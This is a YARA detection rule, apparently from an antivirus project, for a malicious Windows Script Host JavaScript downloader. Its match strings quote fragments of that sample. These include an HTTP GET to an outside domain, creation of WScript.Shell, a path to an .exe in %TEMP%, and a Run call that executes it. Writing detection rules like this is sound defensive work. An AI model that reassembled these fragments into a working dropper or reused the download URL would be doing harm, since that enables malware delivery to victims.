rule sig_20160330_0a60635d60b407302e7e4edd78628b75 {
  meta:
    description = "datamaliciousorder - file 20160330_0a60635d60b407302e7e4edd78628b75.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e1ae20b4949f74818eb540862b1e38f36b8e0bd66dae6dd2d8999aec17778dc0"

  strings:
    $s1  = "D[N](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "function PF(NV, ON){O = O * 1; return NV - ON;};" fullword ascii
    $s3  = "var MF = function CD() {return WScript[HD](\"WScript\"+\".Shell\");}(), Q0 = 11;" fullword ascii
    $s4  = "if (D[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function I() {return MF[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Fdlqstntwln.ex\" + \"e\";};" fullword ascii
    $s6  = "function MQ(){return UH + \"\";};" fullword ascii
    $s7  = "function RA() {return ((NR == true) && (NR == J)) ? 1 : O;};" fullword ascii
    $s8  = "function KE(V){MF[\"Run\"](V, O, O);};" fullword ascii
    $s9  = "function Y(){return 22;};" fullword ascii
    $s10 = "function MH(N0) {var C = (1, 2, 3, 4, 5, N0); return C;};" fullword ascii
    $s11 = "function W(){return HD;};" fullword ascii
    $s12 = "var Z = new this[\"Date\"]();" fullword ascii
    $s13 = "return PF(N1, Y0);" fullword ascii
    $s14 = "function E()" fullword ascii
    $s15 = "}while (H);" fullword ascii
    $s16 = "var J = false;" fullword ascii
    $s17 = "J = true; " fullword ascii
    $s18 = "var H0 = false;" fullword ascii
    $s19 = "NR = true; " fullword ascii
    $s20 = "var NR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}